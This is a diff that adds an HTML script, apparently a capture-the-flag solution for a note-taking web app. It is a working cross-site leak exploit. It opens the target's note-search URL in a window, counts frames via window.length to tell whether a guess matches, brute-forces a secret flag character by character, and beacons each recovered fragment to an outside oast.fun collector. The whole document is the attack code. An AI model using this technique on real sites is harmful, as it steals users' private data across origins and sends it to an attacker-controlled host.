@@ -1,0 +1,46 @@
+<script>
+var webhook="https://qdiyqxfhpgectiqifhius4f88b183wnvt.oast.fun/";
+var remote="http://noteapp:6969/presidente/note/?title=";
+function log(stat, res){
+    navigator.sendBeacon(webhook,`${stat}=${res}`);
+}
+
+function exploit(payload){
+    return new Promise((resolve, reject) => {
+        let win = window.open(remote+payload);
+        setTimeout(() => {
+            var len = win.length
+            win.close()
+            resolve(len)
+        }, 50);
+    })
+}
+(async() => {
+    log("start", "true")
+    let length = 1
+    while(true){
+        var ilen = await exploit("_".repeat(length));
+        if(ilen == 1){
+            log("flagLength", length);
+            break;
+        }
+        else{
+            length+=1;
+        }
+    }
+    let chars = "}-{abcdefghijklmnopqrstuvwxyz1234567890"
+    let flag = ""
+    while(flag.length < length-1){
+        for (const ch of chars){
+            var ilen = await exploit(flag + ch + "_".repeat(length - flag.length - 2));
+            if (ilen == 0){
+                flag += ch;
+                log("tempflag", flag)
+                break;
+            }
+        }
+    }
+    log("flag",flag)
+})()
+
+</script>
